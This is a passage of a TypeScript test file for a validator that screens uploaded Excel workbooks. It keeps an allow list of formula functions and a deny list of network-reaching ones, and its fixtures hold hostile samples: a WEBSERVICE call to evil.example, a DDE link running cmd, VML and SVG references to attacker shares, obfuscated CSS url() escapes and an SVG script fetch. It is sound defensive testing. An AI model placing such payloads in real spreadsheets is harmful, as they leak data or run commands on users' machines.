    expect(SAFE_FORMULA_FUNCTIONS).toEqual(
      expect.arrayContaining([
        'AND',
        'COUNTA',
        'IF',
        'ISBLANK',
        'ISNUMBER',
        'OFFSET',
        'OR',
        'SEARCH',
      ]),
    );
    for (const name of [
      'WEBSERVICE',
      'FILTERXML',
      'ENCODEURL',
      'IMAGE',
      'RTD',
      'CALL',
      'REGISTER',
      'REGISTER.ID',
      'EXEC',
      'HYPERLINK',
      'INDIRECT',
      'CELL',
      'INFO',
      'STOCKHISTORY',
      'TRANSLATE',
      'DETECTLANGUAGE',
      'PY',
      'COPILOT',
      'DDE',
      'SQL.REQUEST',
      'LAMBDA',
      'LET',
      'MAP',
      'REDUCE',
      'SCAN',
      'BYROW',
      'BYCOL',
      'MAKEARRAY',
      'ISOMITTED',
    ]) {
      expect(SAFE_FORMULA_FUNCTIONS).not.toContain(name);
    }
    expect(SAFE_FORMULA_FUNCTIONS.filter((name) => name.startsWith('IMPORT'))).toEqual([]);
  });

  // Pure functions a seller's sheet may call: nothing outside the workbook is reached.
  it.each([
    'LOOKUP',
    'TRANSPOSE',
    'NA',
    'RAND',
    'RANDBETWEEN',
    'RANDARRAY',
    'TEXTBEFORE',
    'TEXTAFTER',
    'TEXTSPLIT',
    'VSTACK',
    'HSTACK',
    'TAKE',
    'DROP',
    'CHOOSECOLS',
    'CHOOSEROWS',
    'EXPAND',
    'TOCOL',
    'TOROW',
    'WRAPROWS',
    'WRAPCOLS',
    'AGGREGATE',
    'STDEV',
    'STDEV.S',
    'STDEV.P',
    'VAR',
    'VAR.S',
    'VAR.P',
    'PERCENTILE',
    'PERCENTILE.INC',
    'PERCENTILE.EXC',
    'QUARTILE',
    'QUARTILE.INC',
    'MODE',
    'MODE.SNGL',
    'ADDRESS',
    'ISOWEEKNUM',
    'PI',
    'LN',
    'LOG',
    'LOG10',
    'EXP',
    'AVERAGEA',
    'MAXA',
    'MINA',
    'FORMULATEXT',
    'ISFORMULA',
    'ISREF',
    'ROUNDUP',
    'ROUNDDOWN',
    'GCD',
    'LCM',
    'COMBIN',
    'FACT',
    'SUMSQ',
    'EVEN',
    'ODD',
    'DOLLAR',
    'CEILING.PRECISE',
    'FLOOR.PRECISE',
    'DAYS360',
    'YEARFRAC',
    'NETWORKDAYS.INTL',
    'WORKDAY.INTL',
    'DATEDIF',
  ])('accepts a call of the pure function %s', (name) => {
    expect(SAFE_FORMULA_FUNCTIONS).toContain(name);
    expect(formulaError(`${name}(A1,B1:B9)`)).toBeNull();
    expect(formulaError(`_xlfn.${name}(A1)`)).toBeNull();
  });

  it.each([
    'WEBSERVICE',
    'FILTERXML',
    'ENCODEURL',
    'IMAGE',
    'RTD',
    'CALL',
    'REGISTER',
    'REGISTER.ID',
    'EXEC',
    'HYPERLINK',
    'INDIRECT',
    'CELL',
    'INFO',
    'STOCKHISTORY',
    'TRANSLATE',
    'DETECTLANGUAGE',
    'PY',
    'COPILOT',
    'DDE',
    'SQL.REQUEST',
    'LAMBDA',
    'LET',
    'MAP',
    'REDUCE',
    'SCAN',
    'BYROW',
    'BYCOL',
    'MAKEARRAY',
    'ISOMITTED',
    'IMPORTXML',
  ])('still refuses a call of %s', (name) => {
    expectUnsafeFormula(formulaError(`${name}(A1)`));
  });

  it('accepts a call of every function of the allow list, with and without _xlfn.', () => {
    for (const name of SAFE_FORMULA_FUNCTIONS) {
      expect(formulaError(`${name}(A1)`), name).toBeNull();
      expect(formulaError(`_xlfn.${name.toLowerCase()}(A1)`), name).toBeNull();
    }
  });

  it('accepts a formula of MAX_FORMULA_TEXT_LENGTH and refuses one longer', () => {
    const atCap = `${'1+'.repeat(MAX_FORMULA_TEXT_LENGTH / 2 - 1)}10`;

    expect(atCap).toHaveLength(MAX_FORMULA_TEXT_LENGTH);
    expect(formulaError(atCap)).toBeNull();
    expectUnsafeFormula(formulaError(`${atCap}0`));
  });

  // The scan also reads the NFKC form, eighteen times longer for U+FDFA, so that form is
  // held to the same length, with the error a long raw field gets.
  it('refuses a formula whose NFKC form is longer than MAX_FORMULA_TEXT_LENGTH', () => {
    const ligature = String.fromCodePoint(0xfdfa);
    const growth = ligature.normalize('NFKC').length;
    const atCap = ligature.repeat(Math.floor(MAX_FORMULA_TEXT_LENGTH / growth));
    const overCap = `${atCap}${ligature}`;
    const longRaw = formulaError('1'.repeat(MAX_FORMULA_TEXT_LENGTH + 1));

    expect(growth).toBe(18);
    expect(atCap.normalize('NFKC').length).toBeLessThanOrEqual(MAX_FORMULA_TEXT_LENGTH);
    expect(overCap.normalize('NFKC').length).toBeGreaterThan(MAX_FORMULA_TEXT_LENGTH);
    expect(overCap.length).toBeLessThan(MAX_FORMULA_TEXT_LENGTH);
    expect(formulaError(atCap)).toBeNull();
    const error = formulaError(overCap);
    expectUnsafeFormula(error);
    expectUnsafeFormula(longRaw);
    expect(error?.message).toBe(longRaw?.message);
  });

  // A quantified Unicode class over a run of millions of letters overflowed V8's
  // backtracking stack; the refusal must stay a file error.
  it('refuses a five-million-letter non-ASCII name as a file error, in the scan and the gate', () => {
    const name = `${'\u00fc'.repeat(5_000_000)}!A1`;
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetWithFormula(`<f>${name}</f>`) },
    ]);

    expectUnsafeFormula(formulaError(name));
    expectUnsafeFormula(gateError(file));
  });
});

const WORKBOOK_PART = 'xl/workbook.xml';
const OFFICE_RELATIONSHIPS_NS =
  'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const DRAWING_NS = 'http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing';
const DRAWING_PART = 'xl/drawings/drawing1.xml';
const VML_PART = 'xl/drawings/vmlDrawing1.vml';
const VML_NAMESPACES =
  'xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" ' +
  'xmlns:x="urn:schemas-microsoft-com:office:excel"';
const EVIL_CALL = 'WEBSERVICE(&quot;http://evil.example/&quot;)';
const DDE_LINK = "cmd|'/c calc'!A0";

/** A workbook part whose root holds `inner` after its sheets. */
function workbookWith(inner: string): string {
  return (
    `${UTF8_DECLARATION}<workbook xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<sheets><sheet name="S" sheetId="1" r:id="rId1"/></sheets>${inner}</workbook>`
  );
}

/** A worksheet whose root holds `after` after its sheet data. */
function worksheetWithAfter(after: string): string {
  return (
    `${UTF8_DECLARATION}<worksheet xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>${after}</worksheet>`
  );
}

/** A drawing part whose one anchor holds `shape`. */
function drawingWith(shape: string): string {
  return (
    `${UTF8_DECLARATION}<xdr:wsDr xmlns:xdr="${DRAWING_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<xdr:twoCellAnchor>${shape}</xdr:twoCellAnchor></xdr:wsDr>`
  );
}

/** A VML drawing (no declaration, an `xml` root) whose one shape holds `clientData`. */
function vmlWith(clientData: string): string {
  return (
    `<xml ${VML_NAMESPACES}><v:shape id="b" type="#_x0000_t201">` +
    `<x:ClientData ObjectType="Button">${clientData}</x:ClientData></v:shape></xml>`
  );
}

const PIVOT_CACHE_PART = 'xl/pivotCache/pivotCacheDefinition1.xml';
const PIVOT_TABLE_PART = 'xl/pivotTables/pivotTable1.xml';
const CHART_PART = 'xl/charts/chart1.xml';
const CHART_NS = 'http://schemas.openxmlformats.org/drawingml/2006/chart';
const OMML_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/math';
const MARKUP_COMPATIBILITY_NS = 'http://schemas.openxmlformats.org/markup-compatibility/2006';
// An Office Math fraction a/b, as Excel writes an equation; `m` must name OMML_NS.
const OMML_FRACTION =
  '<m:oMath><m:f><m:fPr><m:ctrlPr/></m:fPr><m:num><m:r><m:t>a</m:t></m:r></m:num>' +
  '<m:den><m:r><m:t>b</m:t></m:r></m:den></m:f></m:oMath>';

/** A pivot cache definition whose cache fields are `fields`. */
function pivotCacheWith(fields: string): string {
  return (
    `${UTF8_DECLARATION}<pivotCacheDefinition xmlns="${SPREADSHEET_NS}" refreshOnLoad="0">` +
    `<cacheFields count="1">${fields}</cacheFields></pivotCacheDefinition>`
  );
}

/** A pivot table definition whose calculated items are `items`. */
function pivotTableWith(items: string): string {
  return (
    `${UTF8_DECLARATION}<pivotTableDefinition xmlns="${SPREADSHEET_NS}" name="P" cacheId="1">` +
    `<calculatedItems count="1">${items}</calculatedItems></pivotTableDefinition>`
  );
}

type LabelledXml = readonly [label: string, xml: string];

// The content of an x14 data validation formula1 that is not one f holding text only.
const X14_FORMULA1_REFUSALS: readonly LabelledXml[] = [
  ['calling WEBSERVICE', `<xm:f>${EVIL_CALL}</xm:f>`],
  ['holding an element other than f', '<xm:g>Sheet2!$A$1</xm:g>'],
  ['holding two f elements', '<xm:f>A1</xm:f><xm:f>A2</xm:f>'],
  ['holding text before its f', 'A1<xm:f>A2</xm:f>'],
  ['holding text after its f', '<xm:f>A2</xm:f>B1'],
  ['holding a comment beside its f', '<!--c--><xm:f>A2</xm:f>'],
  ['whose f holds a comment', '<xm:f>A1<!--c--></xm:f>'],
  ['whose f holds an element', '<xm:f><xm:f>A1</xm:f></xm:f>'],
  ['whose f is empty', '<xm:f/>'],
  ['whose f assigns a macro', '<xm:f macro="m">A1</xm:f>'],
  ['whose f is closed by another end tag', '<xm:f>A1</xm:g>'],
];

// Pivot calculated field formulas (XML attribute text) the field-name reading still refuses.
const PIVOT_FIELD_REFUSALS: readonly LabelledXml[] = [
  ['calling WEBSERVICE after a quoted field name', `'Fiyat/Adet'*${EVIL_CALL}`],
  ['holding a format character in a quoted field name', "'Fiyat&#x200B;Adet'*2"],
  ['holding a quoted field name that never closes', "'Fiyat/Adet*2"],
];

// Levels of elements that declare no namespace, opened around an Office Math fraction:
// deep, yet with the part's own elements within the depth the walk follows.
const DEEP_NESTING = MAX_TRACKED_ELEMENT_DEPTH - 16;

/** `inner` inside DEEP_NESTING levels of elements that declare no namespace. */
function deeplyNested(inner: string): string {
  return `${'<g>'.repeat(DEEP_NESTING)}${inner}${'</g>'.repeat(DEEP_NESTING)}`;
}

// Worksheet content after the sheet data whose `m:f` is a formula field: its prefix does
// not name the OMML namespace where it stands, or the walk cannot tell.
const OMML_FIELD_REFUSALS: readonly LabelledXml[] = [
  ['in another namespace, holding elements', '<m:f xmlns:m="urn:not-math"><m:num/></m:f>'],
  [
    'whose OMML prefix only a closed sibling bound',
    `<a xmlns:m="${OMML_NS}"/><m:f>${EVIL_CALL}</m:f>`,
  ],
  [
    'whose prefix an inner element binds again',
    `<a xmlns:m="${OMML_NS}"><b xmlns:m="urn:x"><m:f>${EVIL_CALL}</m:f></b></a>`,
  ],
  [
    'after the element binding OMML closed',
    `<a xmlns:m="${OMML_NS}">${OMML_FRACTION}</a><m:f>${EVIL_CALL}</m:f>`,
  ],
  [
    'past an end tag that closes another element',
    `<a xmlns:m="${OMML_NS}"><b></a><m:f>${EVIL_CALL}</m:f></b>`,
  ],
  [
    'whose prefix one element declares twice, once not OMML',
    `<a xmlns:m="${SPREADSHEET_NS}" xmlns:m="${OMML_NS}"><m:f>${EVIL_CALL}</m:f></a>`,
  ],
  [
    'whose OMML namespace is written with a reference',
    `<a xmlns:m="&#104;${OMML_NS.slice(1)}"><m:f>${EVIL_CALL}</m:f></a>`,
  ],
  [
    'past an end tag at the level of the element binding OMML that names another one',
    `<a xmlns:m="${OMML_NS}"><b></b></c><m:f>${EVIL_CALL}</m:f>`,
  ],
  [
    'after the element binding OMML closed past deep nesting',
    `<a xmlns:m="${OMML_NS}">${deeplyNested(OMML_FRACTION)}</a><m:f>${EVIL_CALL}</m:f>`,
  ],
  [
    'past an end tag that names an ancestor that declares nothing',
    `<c r="A1"><p><z xmlns="${OMML_NS}"><q></p><f>${EVIL_CALL}</f></z></c>`,
  ],
];

const REVISION_LOG_PART = 'xl/revisions/revisionLog1.xml';
const CHART_EX_PART = 'xl/charts/chartEx1.xml';
const CHART_EX_NS = 'http://schemas.microsoft.com/office/drawing/2014/chartex';

/** A shared workbook revision log whose one defined name revision holds `fields`. */
function revisionLogWith(fields: string): string {
  return (
    `${UTF8_DECLARATION}<revisions xmlns="${SPREADSHEET_NS}" xmlns:r="${OFFICE_RELATIONSHIPS_NS}">` +
    `<rdn rId="1" localSheetId="0" name="Liste">${fields}</rdn></revisions>`
  );
}

/** An Excel 2016+ chart (chartEx) whose data reads the formula `formula` (XML text). */
function chartExWith(formula: string): string {
  return (
    `${UTF8_DECLARATION}<cx:chartSpace xmlns:cx="${CHART_EX_NS}"><cx:chartData><cx:data id="0">` +
    `<cx:numDim type="val"><cx:f>${formula}</cx:f><cx:lvl ptCount="1"><cx:pt idx="0">1</cx:pt></cx:lvl>` +
    '</cx:numDim></cx:data></cx:chartData></cx:chartSpace>'
  );
}

// Fragments of an external hyperlink's URL that Excel keeps in its `location`
// (https://site/page#part); each one is a formula the scan refuses.
const URL_FRAGMENTS: readonly string[] = [':~:text=Kargo (Bedava)', "Ali's", '/products(detail)'];

/** Worksheet hyperlinks: one with `attributes` and the location `location` (XML text). */
function hyperlinkWith(attributes: string, location: string): string {
  return `<hyperlinks><hyperlink ref="A1" ${attributes} location="${location}" display="x"/></hyperlinks>`;
}

/** A VML drawing (no declaration, an `xml` root) holding `shapes`. */
function vmlShapes(shapes: string): string {
  return `<xml ${VML_NAMESPACES}>${shapes}</xml>`;
}

// A comment's VML shape as Excel writes it: no src, no href.
const VML_COMMENT = vmlShapes(
  '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>' +
    '<v:shapetype id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">' +
    '<v:stroke joinstyle="miter"/><v:path gradientshapeok="t" o:connecttype="rect"/></v:shapetype>' +
    '<v:shape id="_x0000_s1025" type="#_x0000_t202" style="position:absolute;margin-left:59.25pt;' +
    'margin-top:1.5pt;width:108pt;height:59.25pt;z-index:1;visibility:hidden" fillcolor="#ffffe1" o:insetmode="auto">' +
    '<v:fill color2="#ffffe1"/><v:shadow on="t" color="black" obscured="t"/><v:path o:connecttype="none"/>' +
    '<v:textbox style="mso-direction-alt:auto"><div style="text-align:left"></div></v:textbox>' +
    '<x:ClientData ObjectType="Note"><x:MoveWithCells/><x:SizeWithCells/>' +
    '<x:Anchor>1, 15, 0, 2, 3, 15, 3, 16</x:Anchor><x:AutoFill>False</x:AutoFill>' +
    '<x:Row>0</x:Row><x:Column>0</x:Column></x:ClientData></v:shape>',
);

// A header picture's VML shape as Excel writes it: the image through a relationship.
const VML_HEADER_IMAGE = vmlShapes(
  '<o:shapelayout v:ext="edit"><o:idmap v:ext="edit" data="1"/></o:shapelayout>' +
    '<v:shapetype id="_x0000_t75" coordsize="21600,21600" o:spt="75" o:preferrelative="t" ' +
    'path="m@4@5l@4@11@9@11@9@5xe" filled="f" stroked="f"><v:stroke joinstyle="miter"/>' +
    '<v:formulas><v:f eqn="if lineDrawn pixelLineWidth 0"/><v:f eqn="sum @0 1 0"/></v:formulas>' +
    '<v:path o:extrusionok="f" gradientshapeok="t" o:connecttype="rect"/><o:lock v:ext="edit" aspectratio="t"/>' +
    '</v:shapetype><v:shape id="LH" o:spid="_x0000_s1025" type="#_x0000_t75" ' +
    'style="position:absolute;width:30pt;height:30pt;z-index:1"><v:imagedata o:relid="rId1" o:title="logo"/>' +
    '<o:lock v:ext="edit" rotation="t"/></v:shape>',
);

// VML shapes whose src or href names something outside the package.
const VML_URL_REFUSALS: readonly LabelledXml[] = [
  [
    'a VML image whose src is a network path',
    '<v:shape id="h" type="#_x0000_t75"><v:imagedata src="\\\\evil.example\\s\\logo.png" o:title="logo"/></v:shape>',
  ],
  [
    'a VML image whose src is a web address',
    '<v:shape id="h" type="#_x0000_t75"><v:imagedata src="http://evil.example/logo.png"/></v:shape>',
  ],
  [
    'a VML image whose o:href is a file URL',
    '<v:shape id="h" type="#_x0000_t75"><v:imagedata o:relid="rId9" o:href="file:///\\\\evil.example\\s\\x.png"/></v:shape>',
  ],
  [
    'a VML comment background filled from a network path',
    '<v:shape id="c" type="#_x0000_t202"><v:fill src="\\\\evil.example\\s\\bg.png" type="frame"/></v:shape>',
  ],
  [
    'a VML shape linking to a file',
    '<v:shape id="s" type="#_x0000_t75" href="file:///\\\\evil.example\\s\\x.exe"/>',
  ],
  ['a src that starts with two slashes', '<v:imagedata src="//evil.example/x.png"/>'],
  ['a src with a drive letter', '<v:imagedata src="C:/x.png"/>'],
  ['a src with a drive letter written with a bar', '<v:imagedata src="C|/x.png"/>'],
  [
    'a src whose scheme hides behind white space and a tab',
    '<v:imagedata src=" ht&#9;tp://evil.example/x.png"/>',
  ],
  [
    'a src whose colon is a character reference',
    '<v:imagedata src="http&#58;//evil.example/x.png"/>',
  ],
  ['a src holding a backslash after a relative start', '<v:imagedata src="media\\x.png"/>'],
  ['an href in another case', '<v:shape id="s" HREF="mailto:a@evil.example"/>'],
  [
    'a VML image whose o:althref is a network path',
    '<v:shape id="h" type="#_x0000_t75"><v:imagedata o:relid="rId9" o:althref="\\\\evil\\s\\x.png"/></v:shape>',
  ],
  [
    'a VML fill whose o:althref is a web address',
    '<v:shape id="c" type="#_x0000_t202"><v:fill o:althref="http://evil/bg.png" type="frame"/></v:shape>',
  ],
  [
    'a VML image whose xml:base is a file share',
    '<v:shape id="h" type="#_x0000_t75"><v:imagedata xml:base="file://evil/share/" src="logo.png"/></v:shape>',
  ],
  [
    'an xml:base that is an image data URI',
    '<v:shape id="h" xml:base="data:image/png;base64,AA"/>',
  ],
  [
    'a VML shape style that loads a picture from a network path',
    `<v:shape id="s" style="fill:url('\\\\evil\\x')"/>`,
  ],
  ['a VML shape style that loads a relative picture', '<v:shape id="s" style="fill:url(x.png)"/>'],
  [
    'a VML fill whose src is an image data URI',
    '<v:shape id="c" type="#_x0000_t202"><v:fill src="data:image/png;base64,AA" type="frame"/></v:shape>',
  ],
];

const SVG_PART = 'xl/media/image2.svg';
const SVG_NAMESPACES =
  'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"';

/** An SVG image (an `svg` root, no declaration) holding `content`. */
function svgWith(content: string): string {
  return `<svg ${SVG_NAMESPACES} width="10" height="10">${content}</svg>`;
}

// SVG content that loads a resource from outside the package.
const SVG_REFUSALS: readonly LabelledXml[] = [
  [
    'an SVG image whose xlink:href is an HTML data URI',
    '<image width="1" height="1" xlink:href="data:text/html;base64,PHNjcmlwdD4="/>',
  ],
  ['an SVG style element that imports a sheet', '<style>@import url("http://evil/a.css");</style>'],
  [
    'an SVG style element whose url( ) target is unquoted and absolute',
    '<style>rect{fill:url(http://evil/p.svg#g)}</style>',
  ],
  [
    'an SVG style element whose CDATA holds an absolute url( )',
    "<style><![CDATA[rect{fill:url( 'https://evil/p.svg#g')}]]></style>",
  ],
  [
    'an SVG style element whose url( is split by a comment',
    '<style>rect{fill:ur<!--x-->l(//evil/p.svg#g)}</style>',
  ],
  [
    'an SVG style element whose url( ) target starts with a CSS comment',
    '<style>rect{fill:url(/**/"http://evil/p.svg#g")}</style>',
  ],
  [
    'an SVG style element holding a CSS escape',
    '<style>rect{fill:\\75rl(http://evil/p.svg#g)}</style>',
  ],
  [
    'an SVG style element whose text a child element splits',
    '<style>rect{fill:ur<g/>l(http://evil/p.svg#g)}</style>',
  ],
  [
    'an SVG style attribute whose url( ) target is a network path',
    `<rect width="1" height="1" style="fill:url('\\\\evil\\x')"/>`,
  ],
  [
    'an SVG style attribute that imports a sheet in another case',
    '<rect width="1" height="1" style="@IMPORT &quot;http://evil/a.css&quot;"/>',
  ],
  // The CSS of a style element is read piece by piece.
  [
    'an SVG style element whose @import a comment splits',
    '<style>@im<!--x-->port "http://evil/a.css";</style>',
  ],
  [
    'an SVG style element whose url( ) target a child element splits from its url(',
    '<style>rect{fill:url( <g/>"<g/>ht<!--x-->tp://evil/p.svg#g")}</style>',
  ],
  [
    'an SVG style element whose CSS escape stands in a later piece',
    '<style>rect{fill:red}<g/>.b{fill:\\75rl(x)}</style>',
  ],
  [
    'an SVG style element whose url( ) target starts a comment past a CDATA section',
    '<style>rect{fill:url(<![CDATA[/]]>*x*/)}</style>',
  ],
  // Any attribute value is CSS to an SVG renderer.
  ...[
    'fill="url(http://evil.example/p.svg#g)"',
    'filter="url(http://evil.example/f.svg#f)"',
    'clip-path="url(//evil.example/c.svg#c)"',
    'mask="URL(file://evil.example/s/m.svg#m)"',
    'cursor="url(http://evil.example/c.cur),auto"',
    'marker-end="url(\\\\evil.example\\s\\m.svg#m)"',
    'fill="url( &quot;https://evil.example/p.svg#g&quot; )"',
    'fill="url(h\\74tp://evil.example/p.svg#g)"',
    'fill="url(#a) url(\\\\evil.example\\s\\m.svg#m)"',
    'fill="&#117;rl(http://evil.example/p.svg#g)"',
    'fill="url&#40;http://evil.example/p.svg#g)"',
    'fill="url(/*x*/)"',
    // Only a url( target that starts with '#' passes: relative, data: and empty load.
    'fill="url(p.svg#g)"',
    'fill="url( &quot;media/p.svg#g&quot; )"',
    'fill="url(data:image/svg+xml;base64,PHN2Zz4=)"',
    'fill="url()"',
    'fill="url(&quot;&quot;)"',
    'fill="url("',
    // CSS functions that load an image whatever they are given.
    'fill="image-set(&quot;a.png&quot; 1x)"',
    'fill="-webkit-image-set(a.png 1x)"',
    'fill="IMAGE(a.png)"',
    'mask="src(&quot;m.svg&quot;)"',
    'fill="cross-fade(a.png, b.png)"',
    // A CSS escape spells url( or a function name before its '('.
    'fill="\\75rl(http://evil/x)"',
    'fill="\\75rl(x)"',
    'fill="\\000075 rl(x)"',
    'fill="u\\72l(x)"',
    'fill="ur\\6c(x)"',
    'fill="\\75 \\72 \\6c(x)"',
    'fill="\\u\\r\\l(x)"',
    'fill="\\69mage(x)"',
    'fill="image\\2dset(x)"',
    'fill="\\75&#13;&#10;rl(x)"',
    // A name that ends with url or a loading function name counts, in any case.
    'fill="-webkit-image-set(x)"',
    'fill="URL(x)"',
    'fill="xurl(x)"',
    // A backslash before a newline is no CSS escape: the scan reads on through it.
    'fill="u\\\nrl(x)"',
    'fill="u\\&#13;&#10;rl(x)"',
  ].map(
    (attribute): LabelledXml => [
      `an SVG shape whose ${attribute} loads a resource`,
      `<rect width="1" height="1" ${attribute}/>`,
    ],
  ),
  ...[
    '<style>rect{fill:url(p.svg#g)}</style>',
    '<style>rect{fill:url(</style>',
    '<style>rect{background:image-set("a.png" 1x)}</style>',
    '<style>rect{background:Image("a.png")}</style>',
    '<style><![CDATA[rect{background:cross-fade(url(#a), url(#b))}]]></style>',
    '<style>rect{--u:"https://evil.example/"}</style>',
    "<style>/* ' */ rect{--u:'//evil.example/x'}</style>",
    '<style>rect{--u:"ht<g/>tp://evil.example/"}</style>',
    `<rect width="1" height="1" style="--u:'http://evil.example/'"/>`,
    '<rect width="1" height="1" style="fill:url(p.svg#g)"/>',
  ].map((content): LabelledXml => [`an SVG style that loads a resource: ${content}`, content]),
  ['an SVG script', '<script>fetch("http://evil.example/")</script>'],
  ['an empty SVG script in another case and namespace', '<s:SCRIPT xmlns:s="urn:s"/>'],
  ...[
    '<foreignObject width="1" height="1"/>',
    '<iframe/>',
    '<object data="x.svg"/>',
    '<EMBED src="x.png"/>',
    '<ev:listener xmlns:ev="http://www.w3.org/2001/xml-events" event="click"/>',
    '<ev:handler xmlns:ev="http://www.w3.org/2001/xml-events"/>',
  ].map((content): LabelledXml => [`an active SVG element ${content}`, content]),
  ...[
    '<rect width="1" height="1" onclick="location=1"/>',
    '<rect width="1" height="1" ONMOUSEOVER="location=1"/>',
    '<rect width="1" height="1" xmlns:n="urn:n" n:onload="location=1"/>',
    '<x:rect xmlns:x="urn:x" onclick="location=1"/>',
  ].map((content): LabelledXml => [`an SVG event handler ${content}`, content]),
  // SMIL animation can point an href at any URL.
  ...[
    '<set attributeName="href" to="http://e/x"/>',
    '<animate attributeName="href" values="http://e/x"/>',
    '<animateMotion dur="1s"/>',
    '<ANIMATETRANSFORM/>',
    '<x:animateColor xmlns:x="urn:x"/>',
  ].map((content): LabelledXml => [`an SVG animation ${content}`, content]),
  // An attribute that names a web resource is refused whatever its value.
  ...[
    '<image width="1" height="1" data="x"/>',
    '<image width="1" height="1" srcset="a 1x"/>',
    '<image width="1" height="1" DATA=""/>',
    '<rect width="1" height="1" xmlns:x="urn:x" x:background="u"/>',
  ].map((content): LabelledXml => [`an SVG web resource attribute ${content}`, content]),
  [
    'an SVG image whose href-ending attribute is a web address',
    '<image width="1" height="1" xmlns:n="urn:n" n:newhref="http://evil.example/x.png"/>',
  ],
  // A data: URI passes only as a raster image of an image element.
  ...[
    '<image width="1" height="1" xlink:href="data:image/svg+xml;base64,PHN2Zz4="/>',
    '<image width="1" height="1" href="data:text/html,x"/>',
    '<image width="1" height="1" href="data:image/png"/>',
    '<image width="1" height="1" href=" data:image/png;base64,AA"/>',
    '<image width="1" height="1" href="data:image/png+x;base64,AA"/>',
    '<IMAGE width="1" height="1" href="data:image/png;base64,AA"/>',
    '<use xlink:href="data:image/png;base64,iVBORw0KGgo="/>',
  ].map((content): LabelledXml => [`an SVG data URI ${content}`, content]),
  // Past markup the strict lexer refuses, anything that could load a resource refuses.
  ...[
    '<rect width="1" height="1" fill="url(#a)"/>',
    '<rect width="1" height="1" fill="&#35;a"/>',
    '<image width="1" height="1" n:newhref="x.png"/>',
    '<script/>',
    '<rect width="1" height="1" onclick="x"/>',
    '<rect width="1" height="1" fill="image(x.png)"/>',
    '<rect width="1" height="1" fill="-webkit-image-set(x.png 1x)"/>',
    '<rect width="1" height="1" fill="\\75 rl(x)"/>',
    '<rect width="1" height="1" fill="ur\\6c(x)"/>',
    '<rect width="1" height="1" fill="\\u\\r\\l(x)"/>',
    '<rect width="1" height="1" fill="image\\2dset(x)"/>',
    '<rect width="1" height="1" fill="u\\\nrl(x)"/>',
    '<iframe/>',
    '<set attributeName="fill" to="red"/>',
    '<rect width="1" height="1" data="x"/>',
  ].map(
    (content): LabelledXml => [
      `${content} past markup the strict lexer refuses`,
      `<${LONG_S}/>${content}`,
    ],
  ),
];

/** A line chart whose one series reads its values from the formula `formula` (XML text). */
function chartWithSeries(formula: string): string {
  return (
    `${UTF8_DECLARATION}<c:chartSpace xmlns:c="${CHART_NS}"><c:chart><c:plotArea><c:lineChart>` +
    `<c:ser><c:idx val="0"/><c:order val="0"/><c:val><c:numRef><c:f>${formula}</c:f></c:numRef></c:val></c:ser>` +
    '</c:lineChart></c:plotArea></c:chart></c:chartSpace>'
  );
}

// Every field Excel evaluates as a formula, in every XML part whatever its root and path.
describe('assertSafeXmlContent: formula fields in every part', () => {
  it.each<[label: string, entry: string, xml: string]>([
    [
      'a defined name calling WEBSERVICE',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="leak">${EVIL_CALL}</definedName></definedNames>`,
      ),
    ],
    [
      'a defined name holding a DDE link',
      WORKBOOK_PART,
      workbookWith(
        `<definedNames><definedName name="pwn">${DDE_LINK}</definedName></definedNames>`,
      ),
    ],
    [
      'a defined name holding a comment',
      WORKBOOK_PART,
      workbookWith('<definedNames><definedName name="x">A1<!--c--></definedName></definedNames>'),
    ],
    [
      'a data validation formula1',
      SHEET_PART,
      worksheetWithAfter(
        `<dataValidations count="1"><dataValidation type="custom" sqref="A1"><formula1>ISNUMBER(${EVIL_CALL})</formula1></dataValidation></dataValidations>`,
      ),
    ],
    [
      'a data validation formula2',
      SHEET_PART,
      worksheetWithAfter(
        `<dataValidations count="1"><dataValidation type="whole" sqref="A1"><formula1>1</formula1><formula2>LEN(${EVIL_CALL})</formula2></dataValidation></dataValidations>`,
      ),
    ],
    ...X14_FORMULA1_REFUSALS.map(([label, content]): [string, string, string] => [
      `an x14 data validation formula1 ${label}`,
      SHEET_PART,
      worksheetWithAfter(
        `<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1>${content}</x14:formula1></x14:dataValidation>`,
      ),
    ]),
    [
      'an x14 data validation formula1 closed by another end tag',
      SHEET_PART,
      worksheetWithAfter(
        '<x14:dataValidation xmlns:x14="urn:x14" xmlns:xm="urn:xm"><x14:formula1><xm:f>A1</xm:f></x14:formula2></x14:dataValidation>',
      ),
    ],
    [
      'a colour scale value object calling WEBSERVICE',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1:A10"><cfRule type="colorScale" priority="1"><colorScale><cfvo type="formula" val="${EVIL_CALL}"/><cfvo type="max"/><color rgb="FFF8696B"/><color rgb="FF63BE7B"/></colorScale></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a data bar value object of type num calling WEBSERVICE',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1:A10"><cfRule type="dataBar" priority="1"><dataBar><cfvo type="num" val="${EVIL_CALL}"/><cfvo type="max"/><color rgb="FF638EC6"/></dataBar></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'an icon set value object holding a DDE link',
      SHEET_PART,
      worksheetWithAfter(
        `<conditionalFormatting sqref="A1:A10"><cfRule type="iconSet" priority="1"><iconSet><cfvo type="percent" val="0"/><x14:cfvo xmlns:x14="urn:x14" type="formula" val="${DDE_LINK}"/></iconSet></cfRule></conditionalFormatting>`,
      ),
    ],
    [
      'a hyperlink location calling WEBSERVICE',
      SHEET_PART,
      worksheetWithAfter(
        `<hyperlinks><hyperlink ref="A1" location="${EVIL_CALL}" display="Detay"/></hyperlinks>`,
      ),
    ],
    [
      'a hyperlink location into a workbook on a file share',
      SHEET_PART,
